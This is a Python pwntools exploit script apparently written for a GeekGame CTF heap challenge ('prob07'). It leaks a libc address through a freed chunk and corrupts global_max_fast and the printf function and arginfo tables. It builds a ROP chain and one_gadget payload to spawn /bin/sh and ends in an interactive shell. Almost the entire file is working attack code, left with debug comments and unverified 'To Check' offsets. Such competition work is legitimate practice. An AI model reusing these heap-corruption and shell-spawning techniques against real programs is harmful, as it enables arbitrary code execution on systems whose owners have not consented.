#!/usr/bin/env

import pwn as p

local = True
token = ""
p.context.log_level = "debug"

payloadCounter = 0
fullPayload = b""
def savePayload(payload):
	if isinstance(payload, str):
		payload = payload.encode()
	global fullPayload
	fullPayload += payload + b"\n"
	with open("partial-payload-{}.txt".format(payloadCounter), "wb") as file:
		file.write(payload)
	with open("full-payload-{}.txt".format(payloadCounter), "wb") as file:
		file.write(fullPayload)

def sendLine(payload):
	global connection
	savePayload(payload)
	connection.sendline(payload)

binary = p.ELF("./pwn")
p.context.binary = binary
if local:
	connection = p.process("./pwn")
	libc = p.ELF("/usr/lib/libc.so.6")

else:
	connection = p.remote("prob07.geekgame.pku.edu.cn", 10007)
	connection.recvuntil(b"Please input your token:")
	connection.sendline(token.encode())
	libc = p.ELF("./libc.so.6")

#p.pause()

def offset2size(ofs):
	return ((ofs) * 2 - 0x10)
MAIN_ARENA = 0x3ebc40
MAIN_ARENA_DELTA = 0x60
GLOBAL_MAX_FAST = 0x3ed940
PRINTF_FUNCTABLE = 0x3f0658
PRINTF_ARGINFO = 0x3ec870
ONE_GADGET = 0x10a38c

connection.recvuntil("Now you can get a big box, what size?\n")

connection.send(str(offset2size(PRINTF_ARGINFO - MAIN_ARENA)))

connection.recvuntil("Now you can get a bigger box, what size?\n")

connection.send(str(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA)))

connection.recvuntil("Do you want to rename?(y/n)\n")

connection.send("y")

prefix = "Now your name is:"
suffix = ", please input your new name!\n"
freedNameUtilSpace = connection.recvuntil(suffix)
mainArenaPointer = p.u64(freedNameUtilSpace[len(prefix):-len(suffix)].ljust(8, b"\0")) - 0x60
#libc.address = mainArenaPointer - 0x3ebc40
#libc.address = mainArenaPointer - 0x1c1a00
libc.address = mainArenaPointer - 0x10 - libc.symbols["__malloc_hook"] # To Check

freeHook = libc.symbols["__free_hook"] # To Check
#oneGadget = libc.address + 0x4f322
oneGadget = libc.address + 0x4f3c2 # To Check

pop_rdi_ret = 0x00000c13
shell = p.p64(next(libc.search(b"/bin/sh")))
system = p.p64(libc.symbols["system"] - 1)
#system = p.p64(libc.symbols["system"])
stack_alignment = p.p64(pop_rdi_ret + 1)
payload = p.p64(pop_rdi_ret) + shell + stack_alignment + system


p.log.info("mainArenaPointer = " + hex(mainArenaPointer))
p.log.info("libc.address = " + hex(libc.address))
p.log.info("freeHook = " + hex(freeHook))
p.log.info("oneGadget = " + hex(oneGadget))
p.log.info("shell = " + hex(p.u64(shell)))
p.log.info("system = " + hex(p.u64(system)))

offset_libc_stdout = libc.symbols["_IO_2_1_stdout_"]
offset_libc_stdin = libc.symbols["_IO_2_1_stdin_"]
IOListAllAddr = libc.symbols["_IO_list_all"]

p.log.info("puts = " + hex(libc.symbols["puts"]))
p.log.info("printf = " + hex(libc.symbols["printf"]))
p.log.info("system = " + hex(libc.symbols["system"]))
p.log.info("offset_libc_stdout = " + hex(offset_libc_stdout))
p.log.info("offset_libc_stdin = " + hex(offset_libc_stdin))
p.log.info("IOListAllAddr = " + hex(IOListAllAddr))



#p.pause()

if local:
	#connection.send(p.p64(freeHook) + p.p64(freeHook) + b"A" * (0x1000 - 16))
	#connection.send(p.p64(oneGadget) + p.p64(freeHook - 0x10))
	#connection.send(p.p64(oneGadget) + p.p64(freeHook - 0x10))
	#connection.send(p.p64(oneGadget) + p.p64(libc.address + 0x1c4cd8 - 0x10))
	#connection.send(p.p64(oneGadget))
	connection.send(p.p64(oneGadget) + p.p64(IOListAllAddr - 0x10))
else:
	#connection.send(p.p64(oneGadget) + p.p64(freeHook + 0x48))
	connection.send(p.p64(mainArenaPointer) + p.p64(libc.address + GLOBAL_MAX_FAST - 0x10))

#p.pause()

connection.recvuntil("Do you want to edit big box or bigger box?(1:big/2:bigger)\n")

#p.pause()

#connection.send(p.p64(oneGadget))

#print()

connection.send("1")

connection.send(b"1" * 776 + p.p64(oneGadget))

connection.interactive()

# _int_malloc+1366: cmp
# _int_malloc+1370: jne
# gdb -ex "break *main+526" -ex "break *_int_malloc+1356" -ex "break *main+531" -ex "break free"
# jump *_int_malloc+1371

